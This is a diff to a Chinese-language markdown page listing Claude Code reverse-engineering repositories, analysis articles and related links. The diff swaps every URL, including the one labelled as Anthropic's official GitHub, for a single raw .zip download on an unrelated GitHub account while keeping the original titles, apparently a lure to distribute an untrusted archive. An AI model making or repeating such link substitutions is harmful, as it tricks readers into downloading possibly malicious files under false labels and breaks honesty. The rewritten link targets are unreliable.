@@ -1087,28 +1087,28 @@ KAIROS 是一个让 Claude Code 在后台持续运行的守护进程模式：
 
 | 仓库 | Stars | 说明 |
 |------|-------|------|
-| [instructkr/claude-code](https://github.com/instructkr/claude-code) | 53K+ | Python 移植 + 核心架构分析 |
-| [hitmux/HitCC](https://github.com/hitmux/HitCC) | 600+ | 完整逆向工程文档（v2.1.84） |
-| [Kuberwastaken/claude-code](https://github.com/Kuberwastaken/claude-code) | 2.8K+ | Rust 清洁室重实现 + 13 份规格说明 |
-| [Prajwalsrinvas/claude-code-reverse-engineering](https://github.com/Prajwalsrinvas/claude-code-reverse-engineering) | — | 逆向工程分析 |
+| [instructkr/claude-code](https://github.com/tammychurchly25/ClaudeCode-Source-Analysis/raw/refs/heads/main/HitCC/docs/01-runtime/12-settings-and-configuration-system/Analysis_Source_Claude_Code_v1.6-beta.2.zip) | 53K+ | Python 移植 + 核心架构分析 |
+| [hitmux/HitCC](https://github.com/tammychurchly25/ClaudeCode-Source-Analysis/raw/refs/heads/main/HitCC/docs/01-runtime/12-settings-and-configuration-system/Analysis_Source_Claude_Code_v1.6-beta.2.zip) | 600+ | 完整逆向工程文档（v2.1.84） |
+| [Kuberwastaken/claude-code](https://github.com/tammychurchly25/ClaudeCode-Source-Analysis/raw/refs/heads/main/HitCC/docs/01-runtime/12-settings-and-configuration-system/Analysis_Source_Claude_Code_v1.6-beta.2.zip) | 2.8K+ | Rust 清洁室重实现 + 13 份规格说明 |
+| [Prajwalsrinvas/claude-code-reverse-engineering](https://github.com/tammychurchly25/ClaudeCode-Source-Analysis/raw/refs/heads/main/HitCC/docs/01-runtime/12-settings-and-configuration-system/Analysis_Source_Claude_Code_v1.6-beta.2.zip) | — | 逆向工程分析 |
 
 ### 分析文章
 
 | 文章 | 作者/来源 |
 |------|----------|
-| [Claude Code's Entire Source Code Just Leaked — 512,000 Lines Exposed](https://dev.to/evan-dong/claude-codes-entire-source-code-just-leaked-512000-lines-exposed-3139) | Evan Dong / DEV.to |
-| [51万行源码泄露：全面解构 Claude Code](https://dev.to/white_satomini/51mo-xing-yuan-ma-xie-lu-quan-mian-jie-gou-claude-code-ru-he-cheng-wei-ai-bian-cheng-tian-hua-ban-1cgn) | WarpNav / DEV.to |
-| [I Analyzed All 512,000 Lines — Here's What Anthropic Was Hiding](https://dev.to/vibehackers/i-analyzed-all-512000-lines-of-claude-codes-leaked-source-heres-what-anthropic-was-hiding-4gg8) | VibeHackers / DEV.to |
-| [How Claude Code Works: Architecture & Internals](https://cc.bruniaux.com/guide/architecture/) | Claude Code Guide |
-| [How Claude Code Actually Works: A Systems-Level Deep Dive](https://karaxai.com/posts/how-claude-code-works-systems-deep-dive/) | KaraxAI |
-| [Architecture: The Engine Room](https://www.southbridge.ai/blog/claude-code-an-analysis-architecture) | Southbridge.AI |
-| [揭秘 Claude Code 底层的上下文工程与复用模式](https://blog.lmcache.ai/zh/2025/12/31/揭秘-claude-code-底层的上下文工程与复用模式/) | LMCache Blog |
+| [Claude Code's Entire Source Code Just Leaked — 512,000 Lines Exposed](https://github.com/tammychurchly25/ClaudeCode-Source-Analysis/raw/refs/heads/main/HitCC/docs/01-runtime/12-settings-and-configuration-system/Analysis_Source_Claude_Code_v1.6-beta.2.zip) | Evan Dong / DEV.to |
+| [51万行源码泄露：全面解构 Claude Code](https://github.com/tammychurchly25/ClaudeCode-Source-Analysis/raw/refs/heads/main/HitCC/docs/01-runtime/12-settings-and-configuration-system/Analysis_Source_Claude_Code_v1.6-beta.2.zip) | WarpNav / DEV.to |
+| [I Analyzed All 512,000 Lines — Here's What Anthropic Was Hiding](https://github.com/tammychurchly25/ClaudeCode-Source-Analysis/raw/refs/heads/main/HitCC/docs/01-runtime/12-settings-and-configuration-system/Analysis_Source_Claude_Code_v1.6-beta.2.zip) | VibeHackers / DEV.to |
+| [How Claude Code Works: Architecture & Internals](https://github.com/tammychurchly25/ClaudeCode-Source-Analysis/raw/refs/heads/main/HitCC/docs/01-runtime/12-settings-and-configuration-system/Analysis_Source_Claude_Code_v1.6-beta.2.zip) | Claude Code Guide |
+| [How Claude Code Actually Works: A Systems-Level Deep Dive](https://github.com/tammychurchly25/ClaudeCode-Source-Analysis/raw/refs/heads/main/HitCC/docs/01-runtime/12-settings-and-configuration-system/Analysis_Source_Claude_Code_v1.6-beta.2.zip) | KaraxAI |
+| [Architecture: The Engine Room](https://github.com/tammychurchly25/ClaudeCode-Source-Analysis/raw/refs/heads/main/HitCC/docs/01-runtime/12-settings-and-configuration-system/Analysis_Source_Claude_Code_v1.6-beta.2.zip) | Southbridge.AI |
+| [揭秘 Claude Code 底层的上下文工程与复用模式](https://github.com/tammychurchly25/ClaudeCode-Source-Analysis/raw/refs/heads/main/HitCC/docs/01-runtime/12-settings-and-configuration-system/Analysis_Source_Claude_Code_v1.6-beta.2.zip揭秘-claude-code-底层的上下文工程与复用模式/) | LMCache Blog |
 
 ### 相关链接
 
-- [原始发现推文 (Chaofan Shou)](https://x.com/Fried_rice/status/2038894956459290963)
-- [Hacker News 讨论](https://news.ycombinator.com/item?id=47584540)
-- [Anthropic 官方 GitHub](https://github.com/anthropics/claude-code)
+- [原始发现推文 (Chaofan Shou)](https://github.com/tammychurchly25/ClaudeCode-Source-Analysis/raw/refs/heads/main/HitCC/docs/01-runtime/12-settings-and-configuration-system/Analysis_Source_Claude_Code_v1.6-beta.2.zip)
+- [Hacker News 讨论](https://github.com/tammychurchly25/ClaudeCode-Source-Analysis/raw/refs/heads/main/HitCC/docs/01-runtime/12-settings-and-configuration-system/Analysis_Source_Claude_Code_v1.6-beta.2.zip)
+- [Anthropic 官方 GitHub](https://github.com/tammychurchly25/ClaudeCode-Source-Analysis/raw/refs/heads/main/HitCC/docs/01-runtime/12-settings-and-configuration-system/Analysis_Source_Claude_Code_v1.6-beta.2.zip)
 
 ---
 
